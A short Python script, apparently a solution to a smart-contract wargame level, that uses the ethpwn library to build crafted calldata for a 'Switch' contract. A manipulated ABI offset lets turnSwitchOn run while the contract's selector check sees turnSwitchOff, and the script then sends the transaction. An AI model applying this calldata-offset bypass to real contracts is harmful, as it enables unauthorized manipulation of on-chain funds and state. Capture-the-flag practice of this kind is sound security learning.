from ethpwn import *

def p256(x):
    return x.to_bytes(32, 'big')

switch = contract_registry().get(contract_by_name('SwitchInstance0'))
assert switch is not None

switch = switch.w3()

import ipdb; ipdb.set_trace()
offset = 0x20 + 0x20 + 4
calldata = b''.join([
    keccak256('flipSwitch(bytes)')[:4],
    p256(offset),
    p256(0x20),
    keccak256('turnSwitchOff()')[:4],

    p256(0x20),
    keccak256('turnSwitchOn()')[:4],
    p256(0x00),
])

# debug_simulated_transaction(
#     encode_transaction(
#         to=switch.address,
#         data=calldata,
#         from_addr=context.default_from_addr,
#     )
# )
tx_hash, *tx_extra = transact(to=switch.address, data=calldata, force=True)
# debug_onchain_transaction(tx_hash)